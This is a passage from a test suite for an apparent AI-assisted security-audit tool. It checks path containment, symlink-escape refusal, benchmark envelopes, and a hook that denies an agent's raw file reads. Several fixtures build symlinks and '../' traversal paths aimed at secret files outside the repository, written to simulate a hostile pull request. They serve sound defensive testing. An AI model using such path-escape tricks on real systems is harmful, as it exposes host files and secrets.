  const tmpDir103 = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-audit-r10-projid-'));
  try {
    fs.mkdirSync(path.join(tmpDir103, '.security-audit'), { recursive: true });
    fs.writeFileSync(path.join(tmpDir103, '.security-audit', 'project.json'), JSON.stringify({ projectId: 'confirmed-id', source: 'REPOSITORY_EVIDENCE' }), 'utf8');
    fs.writeFileSync(path.join(tmpDir103, 'package.json'), JSON.stringify({ name: 'package-json-id' }), 'utf8');

    const m103 = buildScanManifest({ repoRoot: tmpDir103 });
    if (m103.projectId !== 'confirmed-id') {
      throw new Error(`R10-P1-05 VIOLATION: projectId precedence failed: expected 'confirmed-id', got '${m103.projectId}'`);
    }
  } finally {
    fs.rmSync(tmpDir103, { recursive: true, force: true });
  }
  console.log('✔ 103. R10-P1-05 Invariant: Project identity precedence strictly favors confirmed context over package.json and basename.');

  // ---------------------------------------------------------------------------
  // 104. R10-P1-06: evaluateSecondOpinion evaluates critical zero-candidate cells
  // ---------------------------------------------------------------------------
  const nonCritCell = { id: 'c1', criticality: 'medium', status: 'PENDING' };
  const critCell = { id: 'c2', criticality: 'critical', status: 'PENDING' };
  const firstZero = { status: 'REVIEWED_NO_CANDIDATE', candidates: [], reviewedEvidence: [{ path: 'f.js', line: 1 }] };
  const secondZero = { status: 'REVIEWED_NO_CANDIDATE', candidates: [], reviewedEvidence: [{ path: 'f.js', line: 2 }] };
  const secondVuln = { status: 'CANDIDATE', candidates: [{ id: 'CAND-1', ruleId: 'CWE-89' }] };

  const evalNonCrit = evaluateSecondOpinion({ cell: nonCritCell, firstReview: firstZero });
  if (evalNonCrit.required !== false || evalNonCrit.status !== 'NOT_REQUIRED') {
    throw new Error(`R10-P1-06 VIOLATION: Non-critical cell improperly required second opinion: ${JSON.stringify(evalNonCrit)}`);
  }

  const evalPending = evaluateSecondOpinion({ cell: critCell, firstReview: firstZero });
  if (evalPending.required !== true || evalPending.status !== 'PENDING_SECOND_OPINION') {
    throw new Error(`R10-P1-06 VIOLATION: Critical zero cell did not yield PENDING_SECOND_OPINION: ${JSON.stringify(evalPending)}`);
  }

  const evalAgreed = evaluateSecondOpinion({ cell: critCell, firstReview: firstZero, secondReview: secondZero });
  if (evalAgreed.status !== 'CONFIRMED_ZERO_CANDIDATE' || evalAgreed.evidence.length !== 2) {
    throw new Error(`R10-P1-06 VIOLATION: Agreed zero reviews failed to confirm: ${JSON.stringify(evalAgreed)}`);
  }

  const evalEscalated = evaluateSecondOpinion({ cell: critCell, firstReview: firstZero, secondReview: secondVuln });
  if (evalEscalated.status !== 'ESCALATED_TO_CANDIDATE' || evalEscalated.escalation !== true || evalEscalated.candidates.length !== 1) {
    throw new Error(`R10-P1-06 VIOLATION: Dissenting candidate review failed to escalate: ${JSON.stringify(evalEscalated)}`);
  }
  console.log('✔ 104. R10-P1-06 Invariant: Selective second opinion evaluates critical zero-candidate discovery cells fail-closed.');

  // ---------------------------------------------------------------------------
  // 105. R10-P0-01: CLI threat model validation fails closed on invalid threat model
  // ---------------------------------------------------------------------------
  const badTm105 = {
    components: [{ id: 'CompWithoutEvidence', criticality: 'high' }],
    actors: []
  };
  const valBadTm105 = validateThreatModel(badTm105, process.cwd());
  if (valBadTm105.valid) {
    throw new Error('R10-P0-01 VIOLATION: validateThreatModel allowed component without evidence!');
  }
  const finalizedBadTm = finalizeScan({
    candidates: [],
    manifest: buildScanManifest({ repoRoot: process.cwd(), directoryManifest: buildDirectoryManifest(process.cwd()) }),
    repoRoot: process.cwd(),
    threatModel: badTm105,
    auditIntent: 'DISCOVERY',
    executedStages: ['INVENTORY', 'THREAT_MODELING', 'DISCOVERY_MATRIX', 'VERIFICATION_PANEL', 'FINALIZATION']
  });
  if (finalizedBadTm.summary.canDeclareClean === true || finalizedBadTm.summary.execution.verdict === 'COMPLETE_VERIFIED') {
    throw new Error('R10-P0-01 VIOLATION: finalizeScan declared clean despite invalid threat model!');
  }
  console.log('✔ 105. R10-P0-01 Invariant: CLI threat model validation fails closed under Default-Deny on unevidenced threat model.');

  // ---------------------------------------------------------------------------
  // 106. Issue #2: prepareReviewContext's explicit targetFiles path must not
  // follow a symlink that resolves outside repoRoot. review mode's whole
  // purpose is to prepare context from a diff's changed-file list (targetFiles)
  // -- a symlink added in a hostile PR is exactly the input this test simulates.
  // ---------------------------------------------------------------------------
  const symlinkTestRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-audit-symlink-'));
  try {
    const repo106 = path.join(symlinkTestRoot, 'repo');
    const outside106 = path.join(symlinkTestRoot, 'outside');
    fs.mkdirSync(repo106, { recursive: true });
    fs.mkdirSync(outside106, { recursive: true });
    const secretPath = path.join(outside106, 'secret.txt');
    fs.writeFileSync(secretPath, 'TOP_SECRET_HOST_FILE_CONTENT_test106');
    const linkPath = path.join(repo106, 'leaky-link.txt');

    let symlinkCreated = true;
    try {
      fs.symlinkSync(path.join('..', 'outside', 'secret.txt'), linkPath, 'file');
    } catch {
      // Some restricted local accounts (notably unprivileged Windows users
      // without Developer Mode) cannot create symlinks. CI runners can. Skip
      // rather than fail closed on an environment limitation unrelated to the
      // invariant under test.
      symlinkCreated = false;
    }

    if (symlinkCreated) {
      const prep106 = prepareReviewContext(repo106, { targetFiles: ['leaky-link.txt'] });
      if (prep106.manifest.preparedFilesCount !== 0) {
        throw new Error('SEC-2 VIOLATION: prepareReviewContext followed a symlink escaping repoRoot into targetFiles');
      }
      const contextFile106 = path.join(repo106, 'scratch', 'context', 'leaky-link.txt');
      if (fs.existsSync(contextFile106)) {
        throw new Error('SEC-2 VIOLATION: symlink target content was written into the review context');
      }
      console.log('✔ 106. SEC-2 Invariant: prepareReviewContext refuses to follow a symlink escaping repoRoot via targetFiles.');
    } else {
      console.log('⚠ 106. SEC-2 Invariant: skipped (this account cannot create symlinks) — verified in CI, not locally.');
    }
  } finally {
    fs.rmSync(symlinkTestRoot, { recursive: true, force: true });
  }

  // ---------------------------------------------------------------------------
  // 107. Issue #3: computeEvidenceSnapshot must not follow a symlink whose
  // declared path is inside repoRoot but whose target resolves outside it.
  // This function's output (lineContent, blobHash) is embedded directly into
  // audit baselines and SARIF evidence -- a symlink here is a host-file-content
  // exfiltration primitive, not just a scope-bypass.
  // ---------------------------------------------------------------------------
  const evidenceSymlinkRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-audit-evid-symlink-'));
  try {
    const repo107 = path.join(evidenceSymlinkRoot, 'repo');
    const outside107 = path.join(evidenceSymlinkRoot, 'outside');
    fs.mkdirSync(repo107, { recursive: true });
    fs.mkdirSync(outside107, { recursive: true });
    fs.writeFileSync(path.join(outside107, 'secret.txt'), 'TOP_SECRET_HOST_FILE_CONTENT_test107\n');
    const linkPath107 = path.join(repo107, 'evidence-link.txt');

    let symlinkCreated107 = true;
    try {
      fs.symlinkSync(path.join('..', 'outside', 'secret.txt'), linkPath107, 'file');
    } catch {
      symlinkCreated107 = false;
    }

    if (symlinkCreated107) {
      const snap107 = computeEvidenceSnapshot(repo107, 'evidence-link.txt', 1);
      if (snap107.exists || snap107.lineContent) {
        throw new Error('SEC-3 VIOLATION: computeEvidenceSnapshot followed a symlink escaping repoRoot and returned host file content');
      }
      console.log('✔ 107. SEC-3 Invariant: computeEvidenceSnapshot refuses to follow a symlink escaping repoRoot.');
    } else {
      console.log('⚠ 107. SEC-3 Invariant: skipped (this account cannot create symlinks) — verified in CI, not locally.');
    }
  } finally {
    fs.rmSync(evidenceSymlinkRoot, { recursive: true, force: true });
  }

  // 108. P0 (v1.1.0): Tool Producer Provenance (toolVersion, toolRevision, toolIntegrityDigest, toolDirty)
  const prov108 = getToolProvenance();
  if (!prov108 || typeof prov108 !== 'object') {
    throw new Error('P0-PROVENANCE VIOLATION: getToolProvenance() returned non-object');
  }
  if (prov108.toolName !== '@arcobaleno64/agy-security-audit') {
    throw new Error(`P0-PROVENANCE VIOLATION: toolName mismatch: expected @arcobaleno64/agy-security-audit, got ${prov108.toolName}`);
  }
  if (prov108.toolVersion !== TOOL_VERSION) {
    throw new Error(`P0-PROVENANCE VIOLATION: toolVersion mismatch: expected ${TOOL_VERSION}, got ${prov108.toolVersion}`);
  }
  if (typeof prov108.toolRevision !== 'string' || prov108.toolRevision.length === 0) {
    throw new Error('P0-PROVENANCE VIOLATION: toolRevision must be a non-empty string');
  }
  if (prov108.toolRevision !== 'UNCHECKED_REVISION' && !/^[0-9a-f]{40}$/i.test(prov108.toolRevision)) {
    throw new Error(`P0-PROVENANCE VIOLATION: toolRevision '${prov108.toolRevision}' is neither a 40-char SHA nor UNCHECKED_REVISION`);
  }
  if (typeof prov108.toolDirty !== 'boolean') {
    throw new Error('P0-PROVENANCE VIOLATION: toolDirty must be a boolean');
  }
  if (prov108.toolIntegrityDigest !== null && (!/^[0-9a-f]{64}$/i.test(prov108.toolIntegrityDigest))) {
    throw new Error(`P0-PROVENANCE VIOLATION: toolIntegrityDigest '${prov108.toolIntegrityDigest}' is neither null nor a 64-char hex digest`);
  }

  // 108.2: Verify execution attestation stamps toolProvenance
  const attestation108 = buildExecutionAttestation({ repoRoot: process.cwd() });
  if (!attestation108.toolProvenance || attestation108.toolProvenance.toolVersion !== TOOL_VERSION) {
    throw new Error('P0-PROVENANCE VIOLATION: buildExecutionAttestation failed to stamp toolProvenance');
  }

  // 108.3: Verify SARIF driver properties stamp toolRevision and toolIntegrityDigest
  const sarif108 = renderSarifFromCanonical({
    canonicalFindings: [],
    repoRoot: process.cwd()
  });
  const driver108 = sarif108.runs[0].tool.driver;
  if (driver108.version !== TOOL_VERSION || driver108.semanticVersion !== TOOL_VERSION) {
    throw new Error(`P0-PROVENANCE VIOLATION: SARIF driver version '${driver108.version}' does not match TOOL_VERSION '${TOOL_VERSION}'`);
  }
  if (!driver108.properties || typeof driver108.properties.toolRevision !== 'string') {
    throw new Error('P0-PROVENANCE VIOLATION: SARIF driver.properties missing toolRevision');
  }
  if (!('toolIntegrityDigest' in driver108.properties) || !('toolDirty' in driver108.properties)) {
    throw new Error('P0-PROVENANCE VIOLATION: SARIF driver.properties missing toolIntegrityDigest or toolDirty');
  }

  // 108.4: Verify Markdown report header stamps Tool Producer metadata
  const md108 = renderMarkdownFromCanonical({
    canonicalFindings: [],
    repoRoot: process.cwd()
  });
  if (!md108.includes('- **Tool Producer**: `@arcobaleno64/agy-security-audit` v')) {
    throw new Error('P0-PROVENANCE VIOLATION: Markdown report missing Tool Producer header line');
  }

  // 108.5: Verify finalizeScan stamps modelProvenance.toolRevision and baseline
  const finalization108 = finalizeScan({
    candidates: [{
      id: 'SEC-108-01',
      ruleId: 'SEC-TEST',
      severity: 'HIGH',
      location: { uri: 'test.js', startLine: 1 }
    }],
    repoRoot: process.cwd()
  });
  const finding108 = finalization108.canonicalFindings[0];
  if (!finding108.modelProvenance?.toolRevision) {
    throw new Error('P0-PROVENANCE VIOLATION: finalizeScan canonical finding missing modelProvenance.toolRevision');
  }
  if (!('toolIntegrityDigest' in finding108.modelProvenance)) {
    throw new Error('P0-PROVENANCE VIOLATION: finalizeScan canonical finding missing modelProvenance.toolIntegrityDigest');
  }
  if (!finalization108.baseline?.toolRevision) {
    throw new Error('P0-PROVENANCE VIOLATION: finalizeScan baseline missing toolRevision');
  }

  console.log('✔ 108. P0 Invariant: Tool Producer Provenance deterministically stamps revision, digest, and dirty state across all artifacts.');

  // 109. P0 (v1.1.0): Shadow Context PreToolUse Hook & Telemetry
  const hookScriptPath = path.resolve('hooks/shadow-context-guard.mjs');
  if (!fs.existsSync(hookScriptPath)) {
    throw new Error('HOOK VIOLATION: hooks/shadow-context-guard.mjs does not exist');
  }
  const hooksConfigPath = path.resolve('hooks.json');
  if (!fs.existsSync(hooksConfigPath)) {
    throw new Error('HOOK VIOLATION: hooks.json does not exist');
  }

  // 109.1 Empty stdin non-blocking verification (Contract Rule 1)
  const emptyRes = execFileSync(process.execPath, [hookScriptPath], {
    input: '',
    encoding: 'utf8',
    timeout: 5000
  });
  const emptyParsed = JSON.parse(emptyRes);
  if (emptyParsed.decision !== 'allow') {
    throw new Error(`HOOK VIOLATION: empty stdin did not allow tool execution: ${emptyRes}`);
  }
  if (emptyRes.includes('\r')) {
    throw new Error('HOOK VIOLATION: hook output contains CRLF (Contract Rule 2)');
  }
  const allowedKeys = new Set(['decision', 'reason', 'overwrite', 'permissionOverrides']);
  for (const k of Object.keys(emptyParsed)) {
    if (!allowedKeys.has(k)) {
      throw new Error(`HOOK VIOLATION: extraneous key '${k}' in output (Contract Rule 3)`);
    }
  }

  // 109.2 Non-targeted tool pass-through
  const nonTargetRes = execFileSync(process.execPath, [hookScriptPath], {
    input: JSON.stringify({ toolCall: { name: 'run_command', args: { CommandLine: 'ls' } } }),
    encoding: 'utf8',
    timeout: 5000
  });
  if (JSON.parse(nonTargetRes).decision !== 'allow') {
    throw new Error('HOOK VIOLATION: non-targeted tool was not allowed');
  }

  // 109.3 Redirection of raw file when shadow context is active
  const tempHookFixture = fs.mkdtempSync(path.join(os.tmpdir(), 'test-hook-fixture-'));
  try {
    const fixtureContextDir = path.join(tempHookFixture, 'scratch', 'context');
    const fixtureSrcDir = path.join(tempHookFixture, 'src');
    fs.mkdirSync(fixtureSrcDir, { recursive: true });
    fs.mkdirSync(path.join(fixtureContextDir, 'src'), { recursive: true });

    const rawFilePath = path.join(fixtureSrcDir, 'secrets.js');
    fs.writeFileSync(rawFilePath, 'const key = "RAW_SECRET";\n', 'utf8');

    const prep109 = prepareReviewContext(tempHookFixture);
    const shadowFilePath = path.join(fixtureContextDir, 'src', 'secrets.js');

    const rawCallPayload = JSON.stringify({
      toolCall: {
        name: 'view_file',
        args: {
          AbsolutePath: rawFilePath
        }
      },
      workspacePaths: [tempHookFixture]
    });

    const redirectRes = execFileSync(process.execPath, [hookScriptPath], {
      input: rawCallPayload,
      encoding: 'utf8',
      timeout: 5000
    });
    const redirectParsed = JSON.parse(redirectRes);
    if (redirectParsed.decision !== 'deny') {
      throw new Error(`HOOK VIOLATION: raw file call expected decision: 'deny', got ${redirectRes}`);
    }
    if (!redirectParsed.reason || !redirectParsed.reason.includes('scratch/context')) {
      throw new Error(`HOOK VIOLATION: raw file denial reason must direct to scratch/context: ${redirectParsed.reason}`);
    }
    if (redirectParsed.overwrite !== undefined) {
      throw new Error('HOOK VIOLATION: hook output must not contain unverified overwrite property');
    }

    // Verify guard-events.jsonl was created and contains the denial
    const eventsPath = path.join(fixtureContextDir, 'guard-events.jsonl');
    if (!fs.existsSync(eventsPath)) {
      throw new Error('HOOK VIOLATION: guard-events.jsonl was not written');
    }
    const eventsContent = fs.readFileSync(eventsPath, 'utf8');
    if (!eventsContent.includes('DENIED_RAW') || !eventsContent.includes('secrets.js')) {
      throw new Error(`HOOK VIOLATION: guard-events.jsonl missing expected event: ${eventsContent}`);
    }

    // 109.4 Already-shadowed file pass-through
    const shadowCallPayload = JSON.stringify({
      toolCall: {
        name: 'view_file',
        args: {
          AbsolutePath: shadowFilePath
        }
      },
      workspacePaths: [tempHookFixture]
    });
    const shadowPassRes = execFileSync(process.execPath, [hookScriptPath], {
      input: shadowCallPayload,
      encoding: 'utf8',
      timeout: 5000
    });
    const shadowPassParsed = JSON.parse(shadowPassRes);
    if (shadowPassParsed.decision !== 'allow' || shadowPassParsed.overwrite) {
      throw new Error('HOOK VIOLATION: reading shadow context directly should allow without overwrite');
    }

    // 109.5 Attestation upgrade: finalizeScan with guard-events upgrades contextIsolation to OBSERVED
    const finalWithHook = finalizeScan({
      candidates: [],
      repoRoot: tempHookFixture,
      contextPrep: prep109
    });
    if (finalWithHook.summary.execution.contextIsolation.status !== 'OBSERVED') {
      throw new Error(`HOOK VIOLATION: finalizeScan with guard telemetry expected OBSERVED, got ${finalWithHook.summary.execution.contextIsolation.status}`);
    }
    if (finalWithHook.summary.execution.contextIsolation.pipeline !== 'OBSERVED_SHADOW_CONTEXT_RUNTIME_GUARD') {
      throw new Error(`HOOK VIOLATION: finalizeScan pipeline expected OBSERVED_SHADOW_CONTEXT_RUNTIME_GUARD, got ${finalWithHook.summary.execution.contextIsolation.pipeline}`);
    }
  } finally {
    fs.rmSync(tempHookFixture, { recursive: true, force: true });
  }

  console.log('✔ 109. P0 Invariant: Shadow Context PreToolUse Hook enforces Subprocess Contract, transparent redirection, and truthful OBSERVED attestation.');

  // 110. P0/P1 Invariant: Unified Path Containment, Symlink Boundary Consolidation & TOCTOU-Resistant Atomic Read
  const testRoot110 = fs.mkdtempSync(path.join(os.tmpdir(), 'tcb-containment-test-'));
  const siblingEvil110 = fs.mkdtempSync(path.join(os.tmpdir(), 'tcb-containment-evil-'));
  try {
    const subDir = path.join(testRoot110, 'sub');
    fs.mkdirSync(subDir, { recursive: true });

    const goodFile = path.join(subDir, 'sample.txt');
    const evilFile = path.join(siblingEvil110, 'evil.txt');
    fs.writeFileSync(goodFile, 'AUTHORITATIVE_CONTENT_110\n', 'utf8');
    fs.writeFileSync(evilFile, 'EVIL_CONTENT_110\n', 'utf8');

    // 110.1 isPathContained lexical algebra
    if (!isPathContained(testRoot110, goodFile)) {
      throw new Error('TCB-110 VIOLATION: isPathContained rejected valid child path');
    }
    if (!isPathContained(testRoot110, testRoot110)) {
      throw new Error('TCB-110 VIOLATION: isPathContained rejected exact root match');
    }
    if (isPathContained(testRoot110, path.join(testRoot110, '..', 'escaped.txt'))) {
      throw new Error('TCB-110 VIOLATION: isPathContained accepted parent traversal');
    }
    if (isPathContained(testRoot110, evilFile)) {
      throw new Error('TCB-110 VIOLATION: isPathContained accepted sibling prefix directory');
    }
    if (isPathContained(testRoot110, '../outside.txt')) {
      throw new Error('TCB-110 VIOLATION: isPathContained accepted raw relative traversal marker');
    }

    // 110.2 isRealPathContained symlink and canonical checks
    if (!isRealPathContained(testRoot110, goodFile)) {
      throw new Error('TCB-110 VIOLATION: isRealPathContained rejected normal file');
    }
    if (isRealPathContained(testRoot110, path.join(testRoot110, 'nonexistent-dangling-path.txt'))) {
      throw new Error('TCB-110 VIOLATION: isRealPathContained accepted non-existent path (default-deny)');
    }

    // 110.3 safeReadFileContained atomic read & TOCTOU resistance
    const goodRead = safeReadFileContained(testRoot110, goodFile);
    if (!goodRead.ok || goodRead.content !== 'AUTHORITATIVE_CONTENT_110\n' || goodRead.size !== 26) {
      throw new Error(`TCB-110 VIOLATION: safeReadFileContained failed reading valid file: ${JSON.stringify(goodRead)}`);
    }

    // Sibling / traversal read rejected
    const evilRead = safeReadFileContained(testRoot110, evilFile);
    if (evilRead.ok || evilRead.content !== null) {
      throw new Error('TCB-110 VIOLATION: safeReadFileContained read file in sibling directory');
    }

    // Non-existent read fails cleanly without crash
    const missingRead = safeReadFileContained(testRoot110, path.join(subDir, 'missing.txt'));
    if (missingRead.ok || missingRead.content !== null) {
      throw new Error('TCB-110 VIOLATION: safeReadFileContained succeeded on missing file');
    }

    // Directory target rejected (isFile assertion on fd)
    const dirRead = safeReadFileContained(testRoot110, subDir);
    if (dirRead.ok || dirRead.content !== null) {
      throw new Error('TCB-110 VIOLATION: safeReadFileContained succeeded on directory handle');
    }

    // Symlink containment test (if supported by environment)
    const outsideSecret = path.join(testRoot110, 'outside-secret.txt');
    fs.writeFileSync(outsideSecret, 'SECRET_OUTSIDE');
    const isolatedInnerRoot = path.join(testRoot110, 'inner-root');
    fs.mkdirSync(isolatedInnerRoot, { recursive: true });
    const symlinkTarget = path.join(isolatedInnerRoot, 'leak-link.txt');

    let symlinkWorks = true;
    try {
      fs.symlinkSync(outsideSecret, symlinkTarget, 'file');
    } catch {
      symlinkWorks = false;
    }

    if (symlinkWorks) {
      if (isRealPathContained(isolatedInnerRoot, symlinkTarget)) {
        throw new Error('TCB-110 VIOLATION: isRealPathContained accepted escaping symlink');
      }
      const symlinkRead = safeReadFileContained(isolatedInnerRoot, symlinkTarget, { allowSymlinks: false });
      if (symlinkRead.ok) {
        throw new Error('TCB-110 VIOLATION: safeReadFileContained read symlink when allowSymlinks was false');
      }
    }
  } finally {
    fs.rmSync(testRoot110, { recursive: true, force: true });
    fs.rmSync(siblingEvil110, { recursive: true, force: true });
  }

  console.log('✔ 110. P0/P1 Invariant: Unified Path Containment, Symlink Boundary Consolidation & TOCTOU-Resistant Atomic Read.');

  // 111. P1 Invariant: Recorded Empirical Benchmark Protocol Envelope Integrity & Multi-Run Efficacy
  const testRoot111 = fs.mkdtempSync(path.join(os.tmpdir(), 'empirical-benchmark-test-'));
  try {
    const mockCandidatesRun1 = [
      {
        id: 'CAND-01',
        ruleId: 'CWE-862',
        title: 'Missing Authorization on Critical State Mutation',
        location: { uri: 'evals/semantic-benchmark/01-authz-bypass.js', startLine: 18 },
        component: 'auth',
        family: 'authz-bypass'
      },
      {
        id: 'CAND-02',
        ruleId: 'CWE-639',
        title: 'Cross-Tenant Data Leakage via Unscoped Identifier',
        location: { uri: 'evals/semantic-benchmark/02-cross-tenant-access.js', startLine: 18 },
        component: 'multitenant',
        family: 'cross-tenant-access'
      }
    ];

    const mockCandidatesRun2 = [
      {
        id: 'CAND-01-R2',
        ruleId: 'CWE-862',
        title: 'Missing Authorization on Critical State Mutation',
        location: { uri: 'evals/semantic-benchmark/01-authz-bypass.js', startLine: 18 },
        component: 'auth',
        family: 'authz-bypass'
      },
      {
        id: 'CAND-03',
        ruleId: 'CWE-78',
        title: 'OS Command Injection',
        location: { uri: 'evals/semantic-benchmark/03-confused-deputy.js', startLine: 20 },
        component: 'cmd',
        family: 'injection'
      }
    ];

    const mockVerifiedRun1 = [
      {
        id: 'SEC-001',
        ruleId: 'CWE-862',
        title: 'Missing Authorization on Critical State Mutation',
        location: { uri: 'evals/semantic-benchmark/01-authz-bypass.js', startLine: 18 },
        disposition: 'CONFIRMED'
      },
      {
        id: 'SEC-002',
        ruleId: 'CWE-639',
        title: 'Cross-Tenant Data Leakage',
        location: { uri: 'evals/semantic-benchmark/02-cross-tenant-access.js', startLine: 18 },
        disposition: 'DEFERRED'
      }
    ];

    // 111.1 Envelope generation & schema conformance
    const envelope1 = createBenchmarkRunEnvelope({
      repoRoot: testRoot111,
      benchmarkMode: 'DISCOVERY',
      candidates: mockCandidatesRun1,
      verifiedFindings: mockVerifiedRun1,
      environment: {
        modelId: 'gemini-3.8-flash',
        modelProvider: 'google',
        agyVersion: '1.2.0'
      }
    });

    const envelope2 = createBenchmarkRunEnvelope({
      repoRoot: testRoot111,
      benchmarkMode: 'DISCOVERY',
      candidates: mockCandidatesRun2,
      environment: {
        modelId: 'gemini-3.8-flash',
        modelProvider: 'google',
        agyVersion: '1.2.0'
      }
    });

    const schemaPath = path.resolve('schemas/empirical-benchmark-run.schema.json');
    if (!fs.existsSync(schemaPath)) {
      throw new Error('BENCHMARK VIOLATION: schemas/empirical-benchmark-run.schema.json is missing');
    }
    const schemaDef = JSON.parse(fs.readFileSync(schemaPath, 'utf8'));
    for (const req of schemaDef.required) {
      if (!(req in envelope1)) {
        throw new Error(`BENCHMARK VIOLATION: envelope missing required schema property '${req}'`);
      }
    }

    const valRes1 = validateBenchmarkRunEnvelope(envelope1);
    if (!valRes1.valid || valRes1.errors.length > 0) {
      throw new Error(`BENCHMARK VIOLATION: envelope1 failed validation: ${valRes1.errors.join(', ')}`);
    }

    // Fail-closed checks on envelope tampering
    const badEnvelopeMode = validateBenchmarkRunEnvelope({ ...envelope1, benchmarkMode: 'INVALID_MODE' });
    if (badEnvelopeMode.valid) {
      throw new Error('BENCHMARK VIOLATION: invalid benchmarkMode was accepted');
    }
    const badEnvelopeVer = validateBenchmarkRunEnvelope({ ...envelope1, schemaVersion: '9.9.9' });
    if (badEnvelopeVer.valid) {
      throw new Error('BENCHMARK VIOLATION: invalid schemaVersion was accepted');
    }

    // 111.2 Multi-run stability & efficacy evaluation over envelopes
    const stabilityRes = evaluateStability([envelope1, envelope2], testRoot111);
    if (stabilityRes.totalRuns !== 2) {
      throw new Error(`BENCHMARK VIOLATION: expected totalRuns === 2, got ${stabilityRes.totalRuns}`);
    }
    if (stabilityRes.pairwiseComparisons !== 1) {
      throw new Error(`BENCHMARK VIOLATION: expected pairwiseComparisons === 1, got ${stabilityRes.pairwiseComparisons}`);
    }
    if (stabilityRes.meanJaccardSimilarity !== 0.3333) {
      throw new Error(`BENCHMARK VIOLATION: expected Jaccard 0.3333, got ${stabilityRes.meanJaccardSimilarity}`);
    }
    if (stabilityRes.perfectRecurrenceCount !== 1) {
      throw new Error(`BENCHMARK VIOLATION: expected perfectRecurrenceCount === 1, got ${stabilityRes.perfectRecurrenceCount}`);
    }
    if (!stabilityRes.environmentConsistency || stabilityRes.environmentConsistency.distinctModels[0] !== 'gemini-3.8-flash') {
      throw new Error('BENCHMARK VIOLATION: environmentConsistency was not extracted from envelopes');
    }

    // 111.3 Efficacy derivation against ground truth
    const mockGroundTruth = [
      {
        id: 'SEM-01',
        cwe: 'CWE-862',
        file: 'evals/semantic-benchmark/01-authz-bypass.js',
        targetLine: 18,
        expectedVerdict: 'VULNERABLE'
      },
      {
        id: 'SEM-02',
        cwe: 'CWE-639',
        file: 'evals/semantic-benchmark/02-cross-tenant-access.js',
        targetLine: 18,
        expectedVerdict: 'VULNERABLE'
      }
    ];

    const efficacyRes = evaluateStability([envelope1, envelope2], testRoot111, { groundTruth: mockGroundTruth });
    if (!efficacyRes.empiricalEfficacy) {
      throw new Error('BENCHMARK VIOLATION: empiricalEfficacy was null when groundTruth was provided');
    }
    if (efficacyRes.empiricalEfficacy.meanCandidateRecall !== 0.75) {
      throw new Error(`BENCHMARK VIOLATION: expected meanCandidateRecall 0.75, got ${efficacyRes.empiricalEfficacy.meanCandidateRecall}`);
    }

    // 111.4 Backward compatibility: bare candidate arrays and mixed inputs
    const bareRes = evaluateStability([mockCandidatesRun1, mockCandidatesRun2], testRoot111);
    if (bareRes.meanJaccardSimilarity !== 0.3333) {
      throw new Error(`BENCHMARK VIOLATION: bare candidate arrays failed stability evaluation: ${bareRes.meanJaccardSimilarity}`);
    }
    const mixedRes = evaluateStability([envelope1, mockCandidatesRun2], testRoot111);
    if (mixedRes.meanJaccardSimilarity !== 0.3333) {
      throw new Error(`BENCHMARK VIOLATION: mixed envelope/bare array evaluation failed: ${mixedRes.meanJaccardSimilarity}`);
    }

    // 111.5 Single-envelope discovery eval integration
    const tempEnvFile = path.join(testRoot111, 'run-test.json');
    fs.writeFileSync(tempEnvFile, JSON.stringify(envelope1, null, 2), 'utf8');
    const discEnvRes = runDiscoveryEval(testRoot111, { runFile: tempEnvFile, groundTruth: mockGroundTruth });
    if (discEnvRes.candidateTP !== 2 || discEnvRes.recall !== 1.0) {
      throw new Error(`BENCHMARK VIOLATION: runDiscoveryEval failed on envelope file: ${JSON.stringify(discEnvRes)}`);
    }
  } finally {
    fs.rmSync(testRoot111, { recursive: true, force: true });
  }

  console.log('✔ 111. P1 Invariant: Recorded Empirical Benchmark Protocol Envelope Integrity & Multi-Run Efficacy.');

  // 112. P0 (v1.1.1): Fail-Closed Shadow Context Guard & Multi-Tool Matcher
  const hookScriptPath112 = path.resolve('hooks/shadow-context-guard.mjs');
  const hooksConfigPath112 = path.resolve('hooks.json');
  const hookCfg112 = JSON.parse(fs.readFileSync(hooksConfigPath112, 'utf8'));
  const matcherPattern112 = hookCfg112['shadow-context-guard']?.PreToolUse?.[0]?.matcher;
  if (!matcherPattern112 || typeof matcherPattern112 !== 'string') {
    throw new Error('HOOK-112 VIOLATION: hooks.json missing PreToolUse matcher');
  }
  // 112.1 Matcher must cover all 4 read tools: view_file, grep_search, list_dir, find_by_name
  const matcherRegex112 = new RegExp(`^(?:${matcherPattern112})$`);
  for (const requiredTool of ['view_file', 'grep_search', 'list_dir', 'find_by_name']) {
    if (!matcherRegex112.test(requiredTool)) {
      throw new Error(`HOOK-112 VIOLATION: hooks.json matcher '${matcherPattern112}' fails to cover tool '${requiredTool}'`);
    }
  }

  const tempFixture112 = fs.mkdtempSync(path.join(os.tmpdir(), 'test-guard-112-'));
  try {
    const ctxDir112 = path.join(tempFixture112, 'scratch', 'context');
    const srcDir112 = path.join(tempFixture112, 'src');
    fs.mkdirSync(srcDir112, { recursive: true });
    fs.mkdirSync(path.join(ctxDir112, 'src'), { recursive: true });

    const rawFile112 = path.join(srcDir112, 'app.js');
    const shadowFile112 = path.join(ctxDir112, 'src', 'app.js');
    fs.writeFileSync(rawFile112, 'const token = "RAW_SECRET";\n', 'utf8');
    fs.writeFileSync(shadowFile112, 'const token = "<SECRET:class=KEY:hash=123>";\n', 'utf8');

    const manifestObj112 = {
      schemaVersion: '1.0.0',
      repoRoot: tempFixture112,
      contextRoot: ctxDir112,
      manifestDigest: 'mockdigest112'
    };
    fs.writeFileSync(path.join(ctxDir112, 'context-manifest.json'), JSON.stringify(manifestObj112), 'utf8');

    function invokeHook(toolCall, workspacePaths = [tempFixture112]) {
      const payload = JSON.stringify({
        toolCall,
        workspacePaths,
        conversationId: 'conv-112-test',
        stepIdx: 1,
        modelName: 'gemini-3.8-flash'
      });
      const res = execFileSync(process.execPath, [hookScriptPath112], {
        input: payload,
        encoding: 'utf8',
        timeout: 5000
      });
      return JSON.parse(res);
    }

    // 112.2 view_file on raw repository file: MUST deny, MUST direct to shadow copy, MUST NOT have overwrite
    const vfRawRes = invokeHook({ name: 'view_file', args: { AbsolutePath: rawFile112 } });
    if (vfRawRes.decision !== 'deny') {
      throw new Error(`HOOK-112 VIOLATION: view_file on raw file did not deny: ${JSON.stringify(vfRawRes)}`);
    }
    if (!vfRawRes.reason || !vfRawRes.reason.includes('scratch/context')) {
      throw new Error(`HOOK-112 VIOLATION: denial reason missing scratch/context direction: ${vfRawRes.reason}`);
    }
    if (vfRawRes.overwrite !== undefined) {
